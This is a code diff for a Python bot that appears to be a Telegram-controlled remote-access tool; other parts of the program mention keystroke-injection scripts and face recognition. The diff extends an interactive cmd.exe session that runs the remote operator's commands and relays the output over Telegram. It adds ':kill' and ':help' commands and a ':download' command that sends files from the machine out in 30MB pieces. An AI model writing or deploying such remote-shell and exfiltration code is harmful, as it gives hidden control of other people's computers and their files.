@@ -221,6 +221,13 @@ if isfile(prototxt_filename) and isfile(caffemodel_filename):
 else:
     FACERECOGNITION = False
 
+CMD_SESSION_HELP = r"""
+exit - Exits the cmd session without killing it.
+
+___ SPECIAL COMMANDS ___
+:download <path> - Downloads a file. A file larger then 30MB will be split in more files.
+:kill - Kill the cmd session, also kills the process.
+"""
 
 DUCKYHELP = r"""DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
 REM [comment] – Adds a comment (e.g., REM This is a comment).
@@ -1075,12 +1082,21 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     """
     def cmdsession(self) -> None:
         """Interactive CMD session via Telegram."""
+
+        # Initialize CMD session if not already created
+        if self.cmd_session is None:
+            self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%")
+
         if self.cmd_session_active:
             self.bsend("⚠️ CMD session is already active.")
             return
 
         self.cmd_session_active = True
-        self.bsend("💻 CMD session started. Type 'exit' to quit.")
+        self.bsend(
+            "💻 CMD session started.\n"
+            "Type 'exit' to quit.\n"
+            "Use :help for special commands."
+        )
 
         # Start output reader threads
         self.cmd_session.run_output_reader_thread(
@@ -1088,7 +1104,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             lambda x: self.bsend(f"⚠️ {x}") if x.strip() else None
         )
 
-        sleep(1)
+        sleep(1)  # give the session time to initialize
 
         while True:
             sleep(0.5)
@@ -1097,29 +1113,47 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             if not arguments:
                 continue
 
-            program = arguments[0]
+            program = arguments[0].lower()
 
-            if command.lower() == "exit":
+            if program == "exit":
                 self.bsend("💻 CMD session stopped.")
                 self.cmd_session.stop_output_readed_thread()
                 self.cmd_session_active = False
                 break
 
+            elif program == ":help":
+                self.bsend(CMD_SESSION_HELP)
+
+            elif program == ":kill":
+                self.cmd_session.stop_output_readed_thread()
+                self.cmd_session.kill()
+                self.bsend(
+                    "💀 CMD session killed.\n"
+                    "A new one will be initialized when you use /cmdsession again."
+                )
+                self.cmd_session_active = False
+                self.cmd_session = None
+
             elif program == ":download":
                 path = " ".join(arguments[1:])
                 self.bsend(f"📥 Preparing download for `{path}`")
-                #this is used as a check cause somethimes the cwd is not properly captured and executing another command does the job. And cd almost looks good in it.
+
+                #this is used as a check cause somethimes the cwd is not properly captured and executing another command does the job. And cd almost looks good in it. 
                 self.cmd_session.write_input("cd")
-                sleep(4) # mmmmmmm so nice mmmmmmmm I love handling this fucking process
+                sleep(4)  # I love working with processes..
+
                 filepath = join(self.cmd_session.cwd, path)
-                self.bsend(f"📥 Starting download for `{filepath}`")
+                self.bsend(f"📦 Starting download for `{filepath}`")
+
                 download_thread = Thread(target=self.download_file, args=(filepath,))
                 download_thread.start()
                 download_thread.join()
 
+                self.bsend(f"✅ Download completed for `{filepath}`")
+
             else:
                 self.cmd_session.write_input(command)
-                #self.bsend(f"▶️ Command sent: `{command}`")
+                self.bsend(f"▶️ Command sent: `{command}`")
 
     def cantopen(self, process: str) -> None:
         self.cantopenlist.append(process)
